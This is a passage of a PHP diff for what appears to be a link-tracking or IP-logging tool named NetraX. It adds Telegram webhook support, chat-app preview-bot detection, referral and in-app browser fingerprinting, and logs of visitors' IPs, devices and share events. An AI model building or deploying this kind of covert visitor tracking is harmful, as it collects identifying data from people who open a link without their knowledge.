@@ -21,9 +21,9 @@ if (defined('NETRAX_USERINFO_LOADED')) {
 }
 define('NETRAX_USERINFO_LOADED', true);
 
-/* ── Discord Webhook Integration ──────────────────────────────── */
-if (!defined('DISCORD_WEBHOOK_URL')) {
-    require_once __DIR__ . '/discord_webhook.php';
+/* ── Telegram Webhook Integration ──────────────────────────────── */
+if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
+    require_once __DIR__ . '/telegram_webhook.php';
 }
 
 /* ══════════════════════════════════════════════════════════════════
@@ -375,6 +375,19 @@ function detectOSInfo(string $ua): array
     /* ── Android ──────────────────────────────────────────────── */
     if (preg_match('#\bAndroid\s+([0-9]+(?:\.[0-9]+){0,2})\b#i', $uaSanitized, $m)) {
         $version = normalizeUaVersion($m[1] ?? '');
+        
+        /* Account for Chrome UA Reduction where Android version is frozen at 10 */
+        if ($version === '10') {
+            $hint = $_SERVER['HTTP_SEC_CH_UA_PLATFORM_VERSION'] ?? '';
+            $hint = trim($hint, '" ');
+            if ($hint !== '') {
+                $version = explode('.', $hint)[0];
+            } else {
+                /* Let the user know the OS version might be hidden by the browser */
+                $version = '10+ (API Reduced)';
+            }
+        }
+        
         return [
             'os' => ($version !== '' ? 'Android ' . $version : 'Android'),
             'raw_user_agent' => $uaSanitized,
@@ -721,7 +734,453 @@ function detectDeviceModel(string $ua): string
 }
 
 /* ══════════════════════════════════════════════════════════════════
-   5.  MAIN CAPTURE FUNCTION
+   5.  LINK SHARE & PREVIEW BOT DETECTION
+   ══════════════════════════════════════════════════════════════════ */
+
+/**
+ * Detect if the incoming request is a link preview crawler / bot fetching
+ * Open Graph metadata because a user just shared / pasted the link on a platform.
+ *
+ * @param  string $ua  Raw User-Agent
+ * @param  string $ip  Client IP
+ * @return array{is_preview: bool, platform: string, type: string, description: string, bot_name: string}
+ */
+function detectShareOrPreview(string $ua, string $ip = ''): array
+{
+    $res = [
+        'is_preview'  => false,
+        'platform'    => '',
+        'type'        => '',
+        'description' => '',
+        'bot_name'    => '',
+    ];
+
+    if (empty($ua)) {
+        return $res;
+    }
+
+    $uaClean = sanitizeUserAgent($ua);
+
+    /* ── Ordered list of crawler / preview bot signatures ── */
+    $bots = [
+        // WhatsApp link preview bot / crawler
+        [
+            'pattern'     => '#\bWhatsApp(?:/[0-9.]+| [0-9.]+|\b)#i',
+            'platform'    => 'WhatsApp',
+            'type'        => 'Chat Link Preview',
+            'description' => 'Link pasted/shared in WhatsApp Chat, Group, or Status',
+            'bot'         => 'WhatsApp Link Previewer',
+        ],
+        // Telegram link preview bot
+        [
+            'pattern'     => '#\bTelegramBot\b|\bTelegram\b.*\b(bot|crawler|preview)\b#i',
+            'platform'    => 'Telegram',
+            'type'        => 'Chat Link Preview',
+            'description' => 'Link pasted/shared in Telegram Chat, Channel, or Group',
+            'bot'         => 'TelegramBot Preview Generator',
+        ],
+        // Google Messages / RCS / Android Text Messages link preview
+        [
+            'pattern'     => '#\b(Google-Read-Aloud|Google-PageRenderer|Google-InspectionTool|Google-Transparency-Report|Googlebot-Image|Google-Extended)\b#i',
+            'platform'    => 'Google Messages (SMS/RCS)',
+            'type'        => 'SMS / RCS Link Preview',
+            'description' => 'Link shared via Text Message (Google Messages / RCS)',
+            'bot'         => 'Google Messages Link Expander',
+        ],
+        // Android default SMS / MMS previewers
+        [
+            'pattern'     => '#\bAndroid.*(?:MMS|SMS|Messaging)\b#i',
+            'platform'    => 'SMS / Text Message App',
+            'type'        => 'SMS Link Preview',
+            'description' => 'Link shared via Mobile SMS / Text Message',
+            'bot'         => 'Android SMS Previewer',
+        ],
+        // Apple Messages / iMessage previewer
+        [
+            'pattern'     => '#\bApplebot\b|\bCFNetwork/.*Darwin.*Apple\b#i',
+            'platform'    => 'iMessage / Apple Messages',
+            'type'        => 'iMessage Link Preview',
+            'description' => 'Link shared via iMessage / SMS on Apple device',
+            'bot'         => 'Apple iMessage Link Previewer',
+        ],
+        // Samsung Messages / SMS
+        [
+            'pattern'     => '#\b(SamsungMessages|SecMessages|Samsung.*SMS)\b#i',
+            'platform'    => 'Samsung Messages (SMS)',
+            'type'        => 'SMS Link Preview',
+            'description' => 'Link shared via Text Message on Samsung device',
+            'bot'         => 'Samsung Messages Previewer',
+        ],
+        // Facebook / Messenger link preview
+        [
+            'pattern'     => '#\b(?:facebookexternalhit(?:/[0-9.]+)?|Facebot|facebookcatalog)\b#i',
+            'platform'    => 'Facebook / Messenger',
+            'type'        => 'Social Share / Chat Preview',
+            'description' => 'Link shared on Facebook Post or Messenger Chat',
+            'bot'         => 'Meta / Facebook Link Preview Engine',
+        ],
+        // Discord link preview embed
+        [
+            'pattern'     => '#\bDiscordbot\b#i',
+            'platform'    => 'Discord',
+            'type'        => 'Chat Embed Preview',
+            'description' => 'Link pasted in Discord Server Channel or DM',
+            'bot'         => 'Discord Embed Generator',
+        ],
+        // Twitter / X card preview
+        [
+            'pattern'     => '#\bTwitterbot\b#i',
+            'platform'    => 'Twitter / X',
+            'type'        => 'Tweet / DM Preview Card',
+            'description' => 'Link shared in Tweet/Post or X Direct Message',
+            'bot'         => 'Twitter Card Fetcher',
+        ],
+        // LinkedIn post / message preview
+        [
+            'pattern'     => '#\bLinkedInBot\b#i',
+            'platform'    => 'LinkedIn',
+            'type'        => 'Post / Message Preview',
+            'description' => 'Link shared on LinkedIn Post or Direct Message',
+            'bot'         => 'LinkedIn Open Graph Bot',
+        ],
+        // Snapchat preview
+        [
+            'pattern'     => '#\bSnapchat(?:Bot)?/|Snapchat(?:\s+Developer)?\b#i',
+            'platform'    => 'Snapchat',
+            'type'        => 'Snap / Story Preview',
+            'description' => 'Link shared in Snapchat Chat or Story',
+            'bot'         => 'Snapchat Link Previewer',
+        ],
+        // TikTok preview bot
+        [
+            'pattern'     => '#\b(?:Bytespider|TikTokBot|TikTok.*preview)\b#i',
+            'platform'    => 'TikTok',
+            'type'        => 'Video / Bio Preview',
+            'description' => 'Link shared in TikTok DM, Comment, or Bio',
+            'bot'         => 'TikTok Link Bot (ByteDance)',
+        ],
+        // Skype link preview
+        [
+            'pattern'     => '#\bSkypeUriPreview\b#i',
+            'platform'    => 'Skype',
+            'type'        => 'Chat Link Preview',
+            'description' => 'Link shared in Skype Chat',
+            'bot'         => 'Skype URI Previewer',
+        ],
+        // Slack unfurl bot
+        [
+            'pattern'     => '#\b(?:Slackbot-LinkExpanding|Slack-ImgProxy|Slackbot)\b#i',
+            'platform'    => 'Slack',
+            'type'        => 'Workspace Link Unfurl',
+            'description' => 'Link posted in Slack Channel or DM',
+            'bot'         => 'Slack Link Expanding Bot',
+        ],
+        // Signal messenger preview
+        [
+            'pattern'     => '#\bSignal(?:Bot)?\b#i',
+            'platform'    => 'Signal Messenger',
+            'type'        => 'Private Chat Link Preview',
+            'description' => 'Link shared in Signal Private Chat',
+            'bot'         => 'Signal Preview Proxy',
+        ],
+        // Viber link preview
+        [
+            'pattern'     => '#\bViber(?:Bot)?\b#i',
+            'platform'    => 'Viber',
+            'type'        => 'Chat Link Preview',
+            'description' => 'Link shared in Viber Chat',
+            'bot'         => 'Viber Link Previewer',
+        ],
+        // Line preview
+        [
+            'pattern'     => '#\b(?:Linespider|Line/[0-9.]+)\b#i',
+            'platform'    => 'Line',
+            'type'        => 'Chat Link Preview',
+            'description' => 'Link shared in Line Chat',
+            'bot'         => 'Line Preview Spider',
+        ],
+        // Pinterest bot
+        [
+            'pattern'     => '#\b(?:Pinterest(?:bot)?|Pinterest/0\.2)\b#i',
+            'platform'    => 'Pinterest',
+            'type'        => 'Pin Preview',
+            'description' => 'Link pinned or shared on Pinterest',
+            'bot'         => 'Pinterest Bot',
+        ],
+        // Reddit bot
+        [
+            'pattern'     => '#\bredditbot\b#i',
+            'platform'    => 'Reddit',
+            'type'        => 'Post Preview',
+            'description' => 'Link submitted on Reddit Post or Comment',
+            'bot'         => 'Reddit Link Bot',
+        ],
+        // Search engines & other indexers
+        [
+            'pattern'     => '#\bGooglebot\b#i',
+            'platform'    => 'Google Search',
+            'type'        => 'Search Engine Crawler',
+            'description' => 'Link crawled by Google Search Engine',
+            'bot'         => 'Googlebot',
+        ],
+        [
+            'pattern'     => '#\b(?:bingbot|msnbot)\b#i',
+            'platform'    => 'Microsoft Bing',
+            'type'        => 'Search Engine Crawler',
+            'description' => 'Link crawled by Bing Search Engine',
+            'bot'         => 'Bingbot',
+        ],
+        [
+            'pattern'     => '#\bYahoo(?:.*Preview|.*Seeker)\b#i',
+            'platform'    => 'Yahoo',
+            'type'        => 'Link Preview Crawler',
+            'description' => 'Link crawled by Yahoo Preview Engine',
+            'bot'         => 'Yahoo Link Preview',
+        ],
+        [
+            'pattern'     => '#\bDuckDuckBot\b#i',
+            'platform'    => 'DuckDuckGo',
+            'type'        => 'Search Engine Crawler',
+            'description' => 'Link crawled by DuckDuckGo Privacy Engine',
+            'bot'         => 'DuckDuckBot',
+        ],
+    ];
+
+    foreach ($bots as $b) {
+        if (preg_match($b['pattern'], $uaClean)) {
+            $res['is_preview']  = true;
+            $res['platform']    = $b['platform'];
+            $res['type']        = $b['type'];
+            $res['description'] = $b['description'];
+            $res['bot_name']    = $b['bot'];
+            return $res;
+        }
+    }
+
+    return $res;
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   6.  TRAFFIC ORIGIN & REFERRAL SOURCE DETECTION
+   ══════════════════════════════════════════════════════════════════ */
+
+/**
+ * Detect the originating app, referral platform, or campaign tag when a human
+ * clicks and opens the link.
+ *
+ * @param  string $ua  User-Agent string
+ * @return array{source_platform: string, source_type: string, source_detail: string, is_in_app: bool, raw_referer: string}
+ */
+function detectTrafficSource(string $ua = ''): array
+{
+    $referer     = trim($_SERVER['HTTP_REFERER'] ?? '');
+    $xRequested  = trim($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '');
+    $uaClean     = sanitizeUserAgent($ua ?: ($_SERVER['HTTP_USER_AGENT'] ?? ''));
+    $querySource = trim($_GET['utm_source'] ?? ($_GET['source'] ?? ($_GET['ref'] ?? ($_GET['src'] ?? ''))));
+
+    $res = [
+        'source_platform' => 'Direct / Browser',
+        'source_type'     => 'Direct Navigation',
+        'source_detail'   => 'Direct URL entry or bookmark',
+        'is_in_app'       => false,
+        'raw_referer'     => $referer,
+    ];
+
+    /* ── 1. Check Android X-Requested-With package ID (Highest accuracy for Android In-App WebViews) ── */
+    if (!empty($xRequested)) {
+        $packageMap = [
+            'com.whatsapp'                        => ['WhatsApp', 'WhatsApp In-App WebView'],
+            'com.whatsapp.w4b'                    => ['WhatsApp Business', 'WhatsApp Business In-App WebView'],
+            'org.telegram.messenger'              => ['Telegram', 'Telegram Official Android App'],
+            'org.telegram.plus'                   => ['Telegram (Plus Messenger)', 'Telegram Plus In-App WebView'],
+            'org.thunderdog.challegram'           => ['Telegram X', 'Telegram X In-App WebView'],
+            'com.google.android.apps.messaging'   => ['Google Messages (SMS/RCS)', 'Google Messages Text Message Link'],
+            'com.samsung.android.messaging'       => ['Samsung Messages (SMS)', 'Samsung Messages Text Link'],
+            'com.android.mms'                     => ['SMS / MMS Messaging', 'Default Android SMS App'],
+            'com.instagram.android'               => ['Instagram', 'Instagram In-App Browser'],
+            'com.facebook.katana'                 => ['Facebook App', 'Facebook In-App Browser'],
+            'com.facebook.orca'                   => ['Facebook Messenger', 'Messenger In-App Browser'],
+            'com.facebook.lite'                   => ['Facebook Lite', 'Facebook Lite In-App Browser'],
+            'com.twitter.android'                 => ['Twitter / X', 'Twitter / X In-App Browser'],
+            'com.snapchat.android'                => ['Snapchat', 'Snapchat In-App Browser'],
+            'com.zhiliaoapp.musically'            => ['TikTok', 'TikTok In-App Browser'],
+            'com.ss.android.ugc.trill'            => ['TikTok', 'TikTok In-App Browser'],
+            'com.linkedin.android'                => ['LinkedIn', 'LinkedIn In-App Browser'],
+            'com.discord'                         => ['Discord', 'Discord In-App Browser'],
+            'com.reddit.frontpage'                => ['Reddit', 'Reddit In-App Browser'],
+            'com.google.android.gm'               => ['Gmail', 'Gmail App Link'],
+            'com.microsoft.office.outlook'        => ['Microsoft Outlook', 'Outlook App Link'],
+            'com.skype.raider'                    => ['Skype', 'Skype App Link'],
+            'com.viber.voip'                      => ['Viber', 'Viber Messenger In-App Browser'],
+            'org.thoughtcrime.securesms'          => ['Signal', 'Signal Private Messenger Link'],
+            'jp.naver.line.android'               => ['Line', 'Line Messenger In-App Browser'],
+            'com.tencent.mm'                      => ['WeChat', 'WeChat In-App Browser'],
+            'com.pinterest'                       => ['Pinterest', 'Pinterest In-App Browser'],
+            'com.google.android.youtube'          => ['YouTube App', 'YouTube App In-App Browser'],
+        ];
+
+        foreach ($packageMap as $pkg => [$pName, $pDetail]) {
+            if (stripos($xRequested, $pkg) !== false) {
+                $res['source_platform'] = $pName;
+                $res['source_type']     = 'In-App Browser (WebView)';
+                $res['source_detail']   = $pDetail . " [pkg: {$xRequested}]";
+                $res['is_in_app']       = true;
+                return $res;
+            }
+        }
+
+        /* Generic Android package */
+        $res['source_platform'] = 'Android App (' . $xRequested . ')';
+        $res['source_type']     = 'In-App Browser (WebView)';
+        $res['source_detail']   = "Opened inside Android App [pkg: {$xRequested}]";
+        $res['is_in_app']       = true;
+        return $res;
+    }
+
+    /* ── 2. Check HTTP Referer Header ── */
+    if (!empty($referer)) {
+        $refererPatterns = [
+            '#android-app://com\.whatsapp#i'                         => ['WhatsApp', 'In-App Link Click', 'WhatsApp Android App'],
+            '#https?://(?:web\.)?whatsapp\.com#i'                    => ['WhatsApp Web', 'Web Link Click', 'WhatsApp Web Client'],
+            '#android-app://org\.telegram#i'                         => ['Telegram', 'In-App Link Click', 'Telegram Android App'],
+            '#https?://(?:t\.me|web\.telegram\.org)#i'               => ['Telegram', 'Chat Link Click', 'Telegram Link / Web App'],
+            '#android-app://com\.google\.android\.apps\.messaging#i' => ['Google Messages (SMS/RCS)', 'SMS Link Click', 'Google Messages Text App'],
+            '#android-app://com\.samsung\.android\.messaging#i'      => ['Samsung Messages (SMS)', 'SMS Link Click', 'Samsung Messages SMS App'],
+            '#android-app://com\.android\.mms#i'                     => ['SMS / MMS App', 'SMS Link Click', 'Android Text Message App'],
+            '#android-app://com\.apple\.mobilesms#i'                 => ['iMessage / Apple Messages', 'SMS Link Click', 'Apple Messages App'],
+            '#android-app://com\.instagram\.android#i'               => ['Instagram', 'In-App Link Click', 'Instagram Android App'],
+            '#https?://l\.instagram\.com#i'                          => ['Instagram', 'Social Link Click', 'Instagram Link Shim'],
+            '#android-app://com\.facebook\.katana#i'                 => ['Facebook', 'In-App Link Click', 'Facebook Mobile App'],
+            '#android-app://com\.facebook\.orca#i'                   => ['Facebook Messenger', 'Chat Link Click', 'Messenger App'],
+            '#https?://(?:l|m|www|touch)\.facebook\.com#i'           => ['Facebook', 'Social Link Click', 'Facebook Web / App'],
+            '#android-app://com\.twitter\.android#i'                 => ['Twitter / X', 'In-App Link Click', 'Twitter / X Android App'],
+            '#https?://(?:t\.co|x\.com|twitter\.com)#i'              => ['Twitter / X', 'Social Link Click', 'Twitter t.co Link Wrapper'],
+            '#android-app://com\.snapchat\.android#i'                => ['Snapchat', 'In-App Link Click', 'Snapchat Mobile App'],
+            '#android-app://com\.(?:zhiliaoapp\.musically|ss\.android\.ugc\.trill)#i' => ['TikTok', 'In-App Link Click', 'TikTok App'],
+            '#https?://(?:www\.)?tiktok\.com#i'                      => ['TikTok', 'Social Link Click', 'TikTok Web / App'],
+            '#android-app://com\.linkedin\.android#i'                => ['LinkedIn', 'In-App Link Click', 'LinkedIn Android App'],
+            '#https?://(?:www\.)?linkedin\.com#i'                    => ['LinkedIn', 'Social Link Click', 'LinkedIn Web'],
+            '#android-app://com\.discord#i'                          => ['Discord', 'Chat Link Click', 'Discord Mobile App'],
+            '#https?://(?:www\.)?discord\.com#i'                     => ['Discord', 'Chat Link Click', 'Discord Web'],
+            '#android-app://com\.reddit\.frontpage#i'                => ['Reddit', 'In-App Link Click', 'Reddit Mobile App'],
+            '#https?://(?:www\.)?reddit\.com#i'                      => ['Reddit', 'Social Link Click', 'Reddit Web'],
+            '#android-app://com\.google\.android\.gm#i'              => ['Gmail', 'Email Link Click', 'Gmail Mobile App'],
+            '#https?://mail\.google\.com#i'                          => ['Gmail', 'Email Link Click', 'Gmail Webmail'],
+            '#android-app://com\.microsoft\.office\.outlook#i'       => ['Outlook', 'Email Link Click', 'Outlook Mobile App'],
+            '#https?://outlook\.(?:live|office|office36e)\.com#i'    => ['Outlook', 'Email Link Click', 'Outlook Webmail'],
+            '#android-app://com\.viber\.voip#i'                      => ['Viber', 'Chat Link Click', 'Viber App'],
+            '#android-app://org\.thoughtcrime\.securesms#i'          => ['Signal', 'Chat Link Click', 'Signal Private Messenger'],
+            '#android-app://jp\.naver\.line\.android#i'              => ['Line', 'Chat Link Click', 'Line Messenger App'],
+            '#https?://(?:www\.)?google\.[a-z.]+#i'                  => ['Google Search', 'Search Engine Referral', 'Google Organic Search'],
+            '#https?://(?:www\.)?bing\.com#i'                        => ['Microsoft Bing', 'Search Engine Referral', 'Bing Search'],
+            '#https?://(?:www\.)?youtube\.com#i'                     => ['YouTube', 'Video Referral', 'YouTube Platform'],
+        ];
+
+        foreach ($refererPatterns as $pattern => [$pName, $pType, $pDetail]) {
+            if (preg_match($pattern, $referer)) {
+                $res['source_platform'] = $pName;
+                $res['source_type']     = $pType;
+                $res['source_detail']   = $pDetail;
+                $res['is_in_app']       = (strpos($pattern, 'android-app:') !== false);
+                return $res;
+            }
+        }
+
+        /* Generic web referrer */
+        $parsed = parse_url($referer, PHP_URL_HOST);
+        if (!empty($parsed)) {
+            $res['source_platform'] = 'Web (' . $parsed . ')';
+            $res['source_type']     = 'Web Referral';
+            $res['source_detail']   = 'Referred from website: ' . $parsed;
+            return $res;
+        }
+    }
+
+    /* ── 3. Check In-App Browser User-Agent Signatures ── */
+    $inAppUaPatterns = [
+        '#\bWhatsApp/[0-9.]+#i'                   => ['WhatsApp', 'WhatsApp In-App Browser'],
+        '#\bTelegram\b#i'                         => ['Telegram', 'Telegram In-App Browser'],
+        '#\bFB_IAB\b|\bFBAN\b|\bFBAV\b#i'         => ['Facebook', 'Facebook In-App Browser (FB_IAB)'],
+        '#\bInstagram\b#i'                        => ['Instagram', 'Instagram In-App Browser'],
+        '#\bTwitter(?:Android|Kit)?\b#i'          => ['Twitter / X', 'Twitter / X In-App Browser'],
+        '#\bSnapchat\b#i'                         => ['Snapchat', 'Snapchat In-App Browser'],
+        '#\b(?:musical_ly|ByteLocale|TikTok)\b#i' => ['TikTok', 'TikTok In-App Browser'],
+        '#\bLinkedInApp\b#i'                      => ['LinkedIn', 'LinkedIn In-App Browser'],
+        '#\bDiscord\b#i'                          => ['Discord', 'Discord In-App Browser'],
+        '#\bMicroMessenger\b#i'                   => ['WeChat', 'WeChat In-App Browser'],
+        '#\bLine/[0-9.]+#i'                       => ['Line', 'Line In-App Browser'],
+        '#\bPinterest\b#i'                        => ['Pinterest', 'Pinterest In-App Browser'],
+    ];
+
+    foreach ($inAppUaPatterns as $pattern => [$pName, $pDetail]) {
+        if (preg_match($pattern, $uaClean)) {
+            $res['source_platform'] = $pName;
+            $res['source_type']     = 'In-App Browser (WebView)';
+            $res['source_detail']   = $pDetail;
+            $res['is_in_app']       = true;
+            return $res;
+        }
+    }
+
+    /* ── 4. Check URL Campaign / Tracking Parameters ── */
+    if (!empty($querySource)) {
+        $qLower = strtolower($querySource);
+        $qMap = [
+            'whatsapp' => 'WhatsApp',
+            'telegram' => 'Telegram',
+            'sms'      => 'SMS / Text Message',
+            'text'     => 'SMS / Text Message',
+            'fb'       => 'Facebook',
+            'facebook' => 'Facebook',
+            'ig'       => 'Instagram',
+            'insta'    => 'Instagram',
+            'twitter'  => 'Twitter / X',
+            'x'        => 'Twitter / X',
+            'snapchat' => 'Snapchat',
+            'tiktok'   => 'TikTok',
+            'discord'  => 'Discord',
+            'linkedin' => 'LinkedIn',
+            'email'    => 'Email Campaign',
+        ];
+
+        if (isset($qMap[$qLower])) {
+            $res['source_platform'] = $qMap[$qLower];
+            $res['source_type']     = 'Tagged Link Campaign';
+            $res['source_detail']   = "Link tagged with source={$querySource}";
+            return $res;
+        }
+    }
+
+    if (isset($_GET['fbclid'])) {
+        $res['source_platform'] = 'Facebook';
+        $res['source_type']     = 'Social Click';
+        $res['source_detail']   = 'Facebook Click ID (fbclid) detected';
+        return $res;
+    }
+    if (isset($_GET['gclid'])) {
+        $res['source_platform'] = 'Google';
+        $res['source_type']     = 'Ad / Search Click';
+        $res['source_detail']   = 'Google Click ID (gclid) detected';
+        return $res;
+    }
+    if (isset($_GET['igshid'])) {
+        $res['source_platform'] = 'Instagram';
+        $res['source_type']     = 'Social Share Click';
+        $res['source_detail']   = 'Instagram Share ID (igshid) detected';
+        return $res;
+    }
+    if (isset($_GET['tgwebappdata'])) {
+        $res['source_platform'] = 'Telegram';
+        $res['source_type']     = 'Telegram Mini-App';
+        $res['source_detail']   = 'Telegram WebApp data passed';
+        return $res;
+    }
+
+    return $res;
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   7.  MAIN CAPTURE FUNCTION
    ══════════════════════════════════════════════════════════════════ */
 
 /**
@@ -738,6 +1197,13 @@ function detectDeviceModel(string $ua): string
  *   'browser_version' => string   Browser version
  *   'os'              => string   Operating system
  *   'device_type'     => string   'Mobile' | 'Tablet' | 'Desktop'
+ *   'device_model'    => string   Exact detected hardware model
+ *   'source_platform' => string   WhatsApp | Telegram | SMS | Facebook | Direct ...
+ *   'source_type'     => string   In-App Browser | Direct Navigation ...
+ *   'source_detail'   => string   Detailed origin note
+ *   'is_in_app'       => bool     True if in-app browser/webview
+ *   'is_preview_bot'  => bool     True if preview/crawler bot
+ *   'preview_info'    => array    Preview bot details if crawler
  *   'user_agent'      => string   Raw UA (for reference)
  *   'timestamp'       => string   ISO 8601 timestamp
  *
@@ -748,15 +1214,14 @@ function captureVisitorInfo(): array
     $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
     /* Detect each dimension */
-    $ipInfo    = detectClientIP();
-    $browser   = detectBrowser($ua);
-    $os        = detectOS($ua);
-    $device    = detectDeviceType($ua);
-    $model     = detectDeviceModel($ua);
-    $timestamp = date('Y-m-d H:i:s');
-
-    /* Sec-CH-UA client hint: prefer over UA-parsed browser version */
-    $uaFullHint = $_SERVER['HTTP_SEC_CH_UA_FULL_VERSION_LIST'] ?? '';
+    $ipInfo     = detectClientIP();
+    $browser    = detectBrowser($ua);
+    $os         = detectOS($ua);
+    $device     = detectDeviceType($ua);
+    $model      = detectDeviceModel($ua);
+    $shareInfo  = detectShareOrPreview($ua, $ipInfo['ip']);
+    $traffic    = detectTrafficSource($ua);
+    $timestamp  = date('Y-m-d H:i:s');
 
     return [
         'ip'              => $ipInfo['ip'],
@@ -768,13 +1233,19 @@ function captureVisitorInfo(): array
         'os'              => $os,
         'device_type'     => $device,
         'device_model'    => $model,
+        'source_platform' => $traffic['source_platform'],
+        'source_type'     => $traffic['source_type'],
+        'source_detail'   => $traffic['source_detail'],
+        'is_in_app'       => $traffic['is_in_app'],
+        'is_preview_bot'  => $shareInfo['is_preview'],
+        'preview_info'    => $shareInfo,
         'user_agent'      => $ua,
         'timestamp'       => $timestamp,
     ];
 }
 
 /* ══════════════════════════════════════════════════════════════════
-   6.  TERMINAL OUTPUT
+   8.  TERMINAL OUTPUT & FORMATTERS
    ══════════════════════════════════════════════════════════════════ */
 
 /**
@@ -810,11 +1281,20 @@ function formatVisitorLog(array $info, ?string $templateName = null): string
         $deviceLabel .= ' -- ' . $info['device_model'];
     }
 
+    /* Referral / Origin line */
+    $sourceLabel = $info['source_platform'] ?? 'Direct / Browser';
+    if (!empty($info['source_detail']) && $info['source_detail'] !== 'Direct URL entry or bookmark') {
+        $sourceLabel .= ' (' . $info['source_detail'] . ')';
+    }
+    $inAppLabel = !empty($info['is_in_app']) ? 'YES (In-App WebView)' : 'No (Standard Browser)';
+
     $lines = [
         '',
         $divider,
         '[VISITOR LOG]  ' . $templateName,
         $divider,
+        'Referral: ' . $sourceLabel,
+        'In-App  : ' . $inAppLabel,
         'IPv4    : ' . $ipv4Label,
         'IPv6    : ' . $ipv6Label,
         'Browser : ' . $browserLabel,
@@ -840,6 +1320,46 @@ function formatVisitorLog(array $info, ?string $templateName = null): string
 }
 
 /**
+ * Format a Link Share / Preview alert as a high-visibility terminal block.
+ *
+ * @param  array  $shareInfo     Output of detectShareOrPreview()
+ * @param  array  $visitorInfo   Output of captureVisitorInfo()
+ * @param  string $templateName  Active template name
+ * @return string                Formatted multi-line banner
+ */
+function formatShareAlert(array $shareInfo, array $visitorInfo, string $templateName): string
+{
+    $divider = str_repeat('═', 56);
+    $subdiv  = str_repeat('─', 56);
+
+    $platform = $shareInfo['platform'] ?? 'Social Platform';
+    $desc     = $shareInfo['description'] ?? 'Link shared into chat';
+    $bot      = $shareInfo['bot_name'] ?? 'Preview Bot';
+    $ip       = $visitorInfo['ip'] ?? 'unknown';
+    $time     = $visitorInfo['timestamp'] ?? date('Y-m-d H:i:s');
+
+    $lines = [
+        '',
+        $divider,
+        "  🔗 LINK SHARE DETECTED -- {$platform}",
+        $divider,
+        "  Platform  : {$platform}",
+        "  Activity  : {$desc}",
+        "  Template  : {$templateName}",
+        "  Crawler   : {$bot}",
+        "  Client IP : {$ip}",
+        "  Time      : {$time}",
+        "  Status    : Preview card rendered in recipient's chat!",
+        $subdiv,
+        "  ⚡ NetraX captured the social link share event.",
+        $divider,
+        '',
+    ];
+
+    return implode("\n", $lines);
+}
+
+/**
  * Print the visitor log to PHP's stderr (appears in the built-in
  * PHP server terminal) and also to error_log.
  *
@@ -854,8 +1374,58 @@ function printVisitorToTerminal(string $logText): void
 }
 
 /* ══════════════════════════════════════════════════════════════════
-   7.  DATA STORAGE  (append-only JSON lines → data/visitor_logs.jsonl)
+   9.  DATA STORAGE  (visitor_logs + share_logs)
    ══════════════════════════════════════════════════════════════════ */
+
+/**
+ * Save link share event to data/share_logs.jsonl and data/share_logs.txt.
+ *
+ * @param array  $shareInfo    Preview/share metadata
+ * @param array  $visitorInfo  Visitor/crawler information
+ * @param string $dataDir      Path to data directory
+ */
+function saveShareLog(array $shareInfo, array $visitorInfo, string $dataDir): void
+{
+    if (!is_dir($dataDir)) {
+        mkdir($dataDir, 0750, true);
+    }
+
+    $record = [
+        'event'           => 'link_share_preview',
+        'platform'        => $shareInfo['platform'],
+        'type'            => $shareInfo['type'],
+        'description'     => $shareInfo['description'],
+        'bot_name'        => $shareInfo['bot_name'],
+        'ip'              => $visitorInfo['ip'],
+        'ipv4'            => $visitorInfo['ipv4'] ?? '',
+        'ipv6'            => $visitorInfo['ipv6'] ?? '',
+        'user_agent'      => $visitorInfo['user_agent'] ?? '',
+        'template'        => $visitorInfo['template'] ?? resolveTemplateName($dataDir),
+        'timestamp'       => $visitorInfo['timestamp'],
+    ];
+
+    $jsonLine = json_encode($record, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . "\n";
+    $jsonFile = $dataDir . '/share_logs.jsonl';
+    $fp = fopen($jsonFile, 'a');
+    if ($fp) {
+        flock($fp, LOCK_EX);
+        fwrite($fp, $jsonLine);
+        flock($fp, LOCK_UN);
+        fclose($fp);
+        @chmod($jsonFile, 0640);
+    }
+
+    $txtFile = $dataDir . '/share_logs.txt';
+    $entry = "[{$visitorInfo['timestamp']}] LINK SHARE: {$shareInfo['platform']} ({$shareInfo['type']}) | IP: {$visitorInfo['ip']} | Template: {$record['template']} | Bot: {$shareInfo['bot_name']}\n";
+    $fp2 = fopen($txtFile, 'a');
+    if ($fp2) {
+        flock($fp2, LOCK_EX);
+        fwrite($fp2, $entry);
+        flock($fp2, LOCK_UN);
+        fclose($fp2);
+        @chmod($txtFile, 0640);
+    }
+}
 
 /**
  * Append a visitor record as a JSON line to the log file.
@@ -881,12 +1451,17 @@ function saveVisitorLog(array $info, string $dataDir): void
         'ip_version'      => $info['ip_version'],
         'ipv4'            => $info['ipv4'] ?? '',
         'ipv6'            => $info['ipv6'] ?? '',
+        'source_platform' => $info['source_platform'] ?? 'Direct / Browser',
+        'source_type'     => $info['source_type'] ?? 'Direct Navigation',
+        'source_detail'   => $info['source_detail'] ?? '',
+        'is_in_app'       => $info['is_in_app'] ?? false,
         'browser'         => $info['browser'],
         'browser_version' => $info['browser_version'],
         'os'              => $info['os'],
         'device_type'     => $info['device_type'],
+        'device_model'    => $info['device_model'] ?? '',
         'is_tor'          => $info['is_tor'] ?? false,
-        'template'        => $info['template'] ?? resolveTemplateName(),
+        'template'        => $info['template'] ?? resolveTemplateName($dataDir),
         'timestamp'       => $info['timestamp'],
     ];
 
@@ -902,10 +1477,6 @@ function saveVisitorLog(array $info, string $dataDir): void
         @chmod($logFile, 0640);
     }
 }
-
-/* ══════════════════════════════════════════════════════════════════
-   8.  ALSO SAVE READABLE TEXT LOG  (data/visitor_logs.txt)
-   ══════════════════════════════════════════════════════════════════ */
 
 /**
  * Append a human-readable visitor entry to a text log file.
@@ -932,7 +1503,7 @@ function saveVisitorLogReadable(string $logText, string $dataDir): void
 }
 
 /* ══════════════════════════════════════════════════════════════════
-   9.  ALL-IN-ONE: CAPTURE → LOG → SAVE → RETURN
+   10. ALL-IN-ONE: CAPTURE → LOG → SAVE → RETURN
    ══════════════════════════════════════════════════════════════════
 
    Call this single function from ip.php or any global bootstrap.
@@ -940,11 +1511,8 @@ function saveVisitorLogReadable(string $logText, string $dataDir): void
    ══════════════════════════════════════════════════════════════════ */
 
 /**
- * Capture visitor info, print to terminal, save to data/, and
- * signal the shell script via a flag file.
- *
